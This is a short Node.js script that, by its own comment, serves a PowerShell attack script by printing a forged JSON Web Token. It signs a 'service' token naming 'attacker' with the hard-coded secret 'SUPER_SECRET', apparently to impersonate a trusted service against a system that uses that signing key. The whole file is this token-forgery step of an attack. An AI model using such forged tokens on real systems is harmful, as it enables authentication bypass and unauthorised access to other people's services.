// Minimal script: just print the forged token (called by PowerShell attack script)
const jwt = require("jsonwebtoken");
const token = jwt.sign({ typ: "service", service: "attacker" }, "SUPER_SECRET");
process.stdout.write(token);
